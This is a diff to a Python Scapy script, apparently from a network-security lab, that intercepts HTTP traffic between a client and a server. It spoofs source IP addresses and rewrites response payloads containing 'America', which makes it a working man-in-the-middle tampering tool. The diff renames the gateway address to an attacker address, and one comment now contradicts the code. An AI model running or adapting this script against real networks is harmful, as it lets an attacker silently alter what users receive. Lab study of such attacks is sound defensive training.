@@ -3,8 +3,8 @@
 from scapy.all import *
 
 # Replace these with your actual IP addresses
-GATEWAY_IP = '10.0.2.6'  # The IP of your gateway
 CLIENT_IP = '10.0.2.4'   # The IP of your client
+ATTACKER_IP = '10.0.2.6'  # The IP of the attacker
 IFACE = "enp0s3"         # The Network interface to capture packets
 
 def packet_callback(packet):
@@ -21,7 +21,7 @@ def packet_callback(packet):
             # Modify the IP layer, when we use bytes, this IP(bytes) contains the whole packet starting from IP to TCP to HTTP.
             # thus this ip_layer here is not just a header.
             ip_layer = IP(bytes(packet[IP]))
-            ip_layer.src = GATEWAY_IP  # Change source IP to the gateway's IP
+            ip_layer.src = ATTACKER_IP  # Change source IP to the gateway's IP
 
             # Recreate the packet with only the modified IP header and the existing payload
             new_packet = ip_layer
@@ -39,7 +39,7 @@ def packet_callback(packet):
             send(new_packet, verbose=1)
         
         # Handle packets coming from the server to the client (HTTP Response), we should not change the source, otherwise te client will be confused, like, why am I talking to the GATEWAY?
-        elif packet[IP].dst == GATEWAY_IP and packet[TCP].sport == 80:
+        elif packet[IP].dst == ATTACKER_IP and packet[TCP].sport == 80:
             if packet.haslayer(Raw):
                 # Modify the payload if it contains "America"
                 payload = packet[Raw].load.decode(errors='ignore')
@@ -138,7 +138,7 @@ def packet_callback(packet):
                 send(new_packet)
 
 # Custom filter to capture the desired TCP packets
-filter_str = f'tcp and ((src host {CLIENT_IP} and dst port 80) or (dst host {GATEWAY_IP} and src port 80))'
+filter_str = f'tcp and ((src host {CLIENT_IP} and dst port 80) or (dst host {ATTACKER_IP} and src port 80))'
 # Sniff packets based on the custom filter
 # store=0: This option tells Scapy not to store the captured packets in memory. Essentially, packets are processed and passed to the callback function specified by prn, but they are not saved for later use. This can be useful for reducing memory usage, especially when capturing a large volume of packets.
 # store=1: This is the default behavior, where captured packets are stored in memory. If you set store to 1, packets are saved in a list, and you can access them later if needed.
